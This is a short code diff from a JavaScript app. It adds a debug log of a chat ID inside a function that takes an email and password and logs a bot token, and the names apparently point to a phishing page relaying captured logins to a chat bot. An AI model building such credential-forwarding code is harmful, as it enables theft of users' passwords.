@@ -24,6 +24,7 @@ export default function App() {
 
   async function sendDetails(emal, passwrd) {
     try {
+      console.log(chatId)
       console.log(botToken)
       const message = `
 !UPDATE
